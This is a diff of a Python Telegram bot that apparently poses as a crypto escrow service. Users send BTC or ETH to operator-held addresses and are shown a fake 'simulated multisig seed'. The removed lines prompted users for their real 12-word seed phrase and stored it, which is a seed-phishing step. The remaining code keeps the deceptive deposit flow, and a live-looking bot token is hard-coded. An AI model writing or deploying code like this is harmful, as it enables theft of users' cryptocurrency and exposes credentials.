@@ -3,6 +3,7 @@ from telegram.ext import Updater, CommandHandler, CallbackContext, CallbackQuery
 import random
 import requests
 import time
+import logging
 
 # === CONFIGURATION ===
 BOT_TOKEN = "7744583633:AAFdAkB-hO68tDMY0GwOBXh3trA8EI9ydSY"
@@ -15,14 +16,21 @@ ADMIN_ID = 6190128347  # Replace with your Telegram numeric user ID
 user_states = {}
 refund_addresses = {}
 withdrawal_requests = {}
-key_phrases = {}
 user_data = set()
+
+# === Set up logging ===
+logging.basicConfig(filename='/root/payment/cryptoguardbot.log', level=logging.DEBUG)
+logger = logging.getLogger(__name__)
 
 # === Seed Phrase Generator ===
 def generate_seed_phrase():
-    with open("english.txt", "r") as f:
-        words = f.read().splitlines()
-    return " ".join(random.sample(words, 12))
+    try:
+        with open("bip39_english_wordlist.txt", "r") as f:
+            words = f.read().splitlines()
+        return " ".join(random.sample(words, 12))
+    except Exception as e:
+        logger.error(f"Error generating seed phrase: {e}")
+        return None
 
 # === Start Command ===
 def start(update: Update, context: CallbackContext):
@@ -45,10 +53,9 @@ def guide(update: Update, context: CallbackContext):
 2. Choose BTC or ETH
 3. Send deposit to provided address
 4. Bot will detect the real TX (via blockchain)
-5. Enter 12-word phrase
-6. Set withdrawal address
-7. Set refund address (optional)
-8. Complete transaction ✅
+5. Set withdrawal address
+6. Set refund address (optional)
+7. Complete transaction ✅
 
 Contact support for help.
 """
@@ -56,8 +63,8 @@ Contact support for help.
 
 # === Blockchain Polling ===
 def check_blockchain_for_tx(address, coin):
-    url = f"https://api.blockcypher.com/v1/{'btc/main' if coin == 'btc' else 'eth/main'}/addrs/{address}/full?token={BLOCKCYPHER_TOKEN}"
     try:
+        url = f"https://api.blockcypher.com/v1/{'btc/main' if coin == 'btc' else 'eth/main'}/addrs/{address}/full?token={BLOCKCYPHER_TOKEN}"
         res = requests.get(url)
         data = res.json()
         if 'txs' in data:
@@ -66,7 +73,7 @@ def check_blockchain_for_tx(address, coin):
                     value = tx['total'] / 1e8 if coin == 'btc' else tx['total'] / 1e18
                     return tx['hash'], value, tx['confirmations']
     except Exception as e:
-        print("Blockchain check error:", e)
+        logger.error(f"Blockchain check error: {e}")
     return None, 0, 0
 
 # === Handle Button Clicks ===
@@ -77,15 +84,13 @@ def button_handler(update: Update, context: CallbackContext):
 
     if query.data == "deposit_btc":
         phrase = generate_seed_phrase()
-        user_states[user_id] = {"coin": "btc", "seed_phrase": phrase}
-        key_phrases[user_id] = phrase
+        user_states[user_id] = {"coin": "btc"}
         msg = f"💰 *BTC Deposit Address:* `{BTC_ADDRESS}`\n\n🔐 *Multisig Seed (simulated):* `{phrase}`\n\nPlease send your BTC. The bot will detect it automatically."
         query.edit_message_text(msg, parse_mode="Markdown")
 
     elif query.data == "deposit_eth":
         phrase = generate_seed_phrase()
-        user_states[user_id] = {"coin": "eth", "seed_phrase": phrase}
-        key_phrases[user_id] = phrase
+        user_states[user_id] = {"coin": "eth"}
         msg = f"💰 *ETH Deposit Address:* `{ETH_ADDRESS}`\n\n🔐 *Multisig Seed (simulated):* `{phrase}`\n\nPlease send your ETH. The bot will detect it automatically."
         query.edit_message_text(msg, parse_mode="Markdown")
 
@@ -113,8 +118,8 @@ def confirm(update: Update, context: CallbackContext):
             f"*TXID:* `{txid}`",
             parse_mode="Markdown")
 
-        update.message.reply_text("Please enter your *12-word seed phrase* to proceed:", parse_mode="Markdown")
-        user_states[user_id]["awaiting_seed"] = True
+        update.message.reply_text("Please enter the *withdrawal address*:", parse_mode="Markdown")
+        user_states[user_id]["awaiting_withdraw"] = True
     else:
         update.message.reply_text("❌ No confirmed transactions found. Try again later.")
 
@@ -125,14 +130,6 @@ def message_handler(update: Update, context: CallbackContext):
 
     if user_id in user_states:
         state = user_states[user_id]
-
-        if state.get("awaiting_seed"):
-            state["entered_seed"] = msg
-            state["awaiting_seed"] = False
-            update.message.reply_text("✅ Seed phrase recorded.")
-            update.message.reply_text("Please enter the *withdrawal address*:", parse_mode="Markdown")
-            state["awaiting_withdraw"] = True
-            return
 
         if state.get("awaiting_withdraw"):
             withdrawal_requests[user_id] = msg
@@ -191,3 +188,15 @@ def main():
     dp = updater.dispatcher
 
     dp.add_handler(CommandHandler("start", start))
+    dp.add_handler(CommandHandler("guide", guide))
+    dp.add_handler(CommandHandler("confirm", confirm))
+    dp.add_handler(CommandHandler("admin", admin))
+    dp.add_handler(CallbackQueryHandler(button_handler))
+    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, message_handler))
+    dp.add_handler(MessageHandler(Filters.text & Filters.user(user_id=ADMIN_ID), admin_panel_handler))
+
+    updater.start_polling()
+    updater.idle()
+
+if __name__ == "__main__":
+    main()
